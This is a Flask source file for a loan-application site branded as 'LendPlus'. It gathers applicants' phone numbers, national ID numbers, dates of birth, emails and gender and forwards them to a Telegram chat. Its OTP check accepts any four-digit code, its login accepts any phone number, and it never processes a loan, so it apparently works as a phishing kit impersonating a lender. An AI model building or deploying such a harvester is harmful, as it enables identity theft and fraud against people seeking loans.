# app.py - Full version without config.py
from flask import Flask, render_template, request, session, redirect, url_for
import os
import logging
from datetime import datetime
import requests

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)

APP_NAME = "LendPlus"
COMPANY_NAME = "Aventus Technology Limited"
SUPPORT_PHONE = "+254 709 029 000"
SUPPORT_EMAIL = "customer@lendplus.ke"
MIN_LOAN = 1000
MAX_LOAN = 50000

LOAN_PRODUCTS = {
    'small': {'min': 1000, 'max': 10000, 'interest': 5, 'months': 1},
    'medium': {'min': 10001, 'max': 30000, 'interest': 8, 'months': 3},
    'large': {'min': 30001, 'max': 50000, 'interest': 12, 'months': 6}
}
# ==================== END CONFIG ====================

def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_ENABLED:
        logger.warning("Telegram not configured - message not sent")
        return None
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        logger.error(f"Telegram error: {e}")
        return None

def format_application_message(data):
    """Format application for Telegram"""
    amount = data.get('loan_amount', 0)
    if amount <= 10000:
        rate, months = 5, 1
    elif amount <= 30000:
        rate, months = 8, 3
    else:
        rate, months = 12, 6
    
    interest = amount * (rate / 100)
    total = amount + interest
    
    return f"""
📋 <b>NEW LOAN APPLICATION</b>
━━━━━━━━━━━━━━━━━━━━━

👤 <b>Personal Information</b>
• Full Name: {data.get('first_name', 'N/A')} {data.get('last_name', 'N/A')}
• Phone: +254 {data.get('phone', 'N/A')}
• Email: {data.get('email', 'N/A')}
• ID Number: {data.get('national_id', 'N/A')}
• Gender: {data.get('gender', 'N/A')}

💰 <b>Loan Details</b>
• Amount: KES {amount:,.2f}
• Interest Rate: {rate}%
• Interest Amount: KES {interest:,.2f}
• Total Repayment: KES {total:,.2f}
• Term: {months} month(s)

🕐 <b>Application Time</b>
• Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• Application ID: {data.get('application_id', 'N/A')}

━━━━━━━━━━━━━━━━━━━━━
<b>Status: ⏳ Pending Review</b>

📱 Support: {SUPPORT_PHONE}
"""

def calculate_loan_details(amount):
    """Calculate loan interest and repayment"""
    if amount <= 10000:
        product = LOAN_PRODUCTS['small']
    elif amount <= 30000:
        product = LOAN_PRODUCTS['medium']
    else:
        product = LOAN_PRODUCTS['large']
    
    interest = amount * (product['interest'] / 100)
    total = amount + interest
    
    return {
        'product': product,
        'interest': interest,
        'total': total,
        'interest_rate': product['interest'],
        'months': product['months']
    }

def generate_application_id():
    """Generate unique application ID"""
    return f"LN{datetime.now().strftime('%Y%m%d%H%M%S')}"

# ==================== ROUTES ====================

@app.route('/')
def index():
    return render_template('index.html', 
                         app_name=APP_NAME,
                         support_phone=SUPPORT_PHONE)

@app.route('/apply', methods=['GET', 'POST'])
def apply():
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        if phone and len(phone) >= 7:
            session['phone'] = phone
            return redirect(url_for('verify_otp'))
        else:
            return render_template('apply.html', error="Please enter a valid phone number")
    return render_template('apply.html')

@app.route('/verify-otp', methods=['GET', 'POST'])
def verify_otp():
    if 'phone' not in session:
        return redirect(url_for('apply'))
    
    if request.method == 'POST':
        otp = request.form.get('otp', '').strip()
        if otp and len(otp) >= 4 and otp.isdigit():
            session['verified'] = True
            return redirect(url_for('personal_info'))
        else:
            return render_template('verify_otp.html', 
                                 phone=session.get('phone'),
                                 error="Please enter a valid verification code")
    return render_template('verify_otp.html', phone=session.get('phone'))

@app.route('/personal-info', methods=['GET', 'POST'])
def personal_info():
    if not session.get('verified'):
        return redirect(url_for('apply'))
    
    if request.method == 'POST':
        required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
        for field in required:
            if not request.form.get(field, '').strip():
                return render_template('personal_info.html', 
                                     error="Please fill in all required fields")
        
        session['first_name'] = request.form.get('first_name').strip()
        session['last_name'] = request.form.get('last_name').strip()
        session['middle_name'] = request.form.get('middle_name', '').strip()
        session['dob'] = request.form.get('dob')
        session['national_id'] = request.form.get('national_id').strip()
        session['email'] = request.form.get('email').strip()
        session['gender'] = request.form.get('gender')
        session['alt_phone'] = request.form.get('alt_phone', '').strip()
        
        return redirect(url_for('loan_amount'))
    
    return render_template('personal_info.html')

@app.route('/loan-amount', methods=['GET', 'POST'])
def loan_amount():
    if not session.get('verified'):
        return redirect(url_for('apply'))
    
    if request.method == 'POST':
        try:
            amount = float(request.form.get('loan_amount', 0))
            if amount < MIN_LOAN or amount > MAX_LOAN:
                return render_template('loan_amount.html', 
                                     error=f"Amount must be between KES {MIN_LOAN:,.0f} and KES {MAX_LOAN:,.0f}")
            
            details = calculate_loan_details(amount)
            application_id = generate_application_id()
            
            application_data = {
                'first_name': session.get('first_name', ''),
                'last_name': session.get('last_name', ''),
                'phone': session.get('phone', ''),
                'email': session.get('email', ''),
                'national_id': session.get('national_id', ''),
                'gender': session.get('gender', ''),
                'dob': session.get('dob', ''),
                'loan_amount': amount,
                'interest': details['interest'],
                'total': details['total'],
                'interest_rate': details['interest_rate'],
                'months': details['months'],
                'application_id': application_id
            }
            
            # Send to Telegram
            if TELEGRAM_ENABLED:
                try:
                    message = format_application_message(application_data)
                    send_telegram_message(message)
                    send_telegram_message(
                        f"🔔 New application from {application_data['first_name']} "
                        f"{application_data['last_name']} for KES {amount:,.2f}"
                    )
                    logger.info(f"Application {application_id} sent to Telegram")
                except Exception as e:
                    logger.error(f"Failed to send to Telegram: {e}")
            
            session['application_data'] = application_data
            return redirect(url_for('confirmation'))
            
        except ValueError:
            return render_template('loan_amount.html', error="Please enter a valid amount")
    
    return render_template('loan_amount.html', min_loan=MIN_LOAN, max_loan=MAX_LOAN)

@app.route('/confirmation')
def confirmation():
    if not session.get('verified'):
        return redirect(url_for('apply'))
    
    data = session.get('application_data', {})
    if not data:
        return redirect(url_for('loan_amount'))
    
    return render_template('confirmation.html',
                         first_name=data.get('first_name', ''),
                         last_name=data.get('last_name', ''),
                         amount=data.get('loan_amount', 0),
                         interest=data.get('interest', 0),
                         total=data.get('total', 0),
                         months=data.get('months', 0),
                         application_id=data.get('application_id', ''),
                         support_phone=SUPPORT_PHONE)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html', phone=session.get('user_phone', ''))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        if phone:
            session['logged_in'] = True
            session['user_phone'] = phone
            return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/how-to-borrow')
def how_to_borrow():
    return render_template('how_to_borrow.html')

@app.route('/reviews')
def reviews():
    return render_template('reviews.html')

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)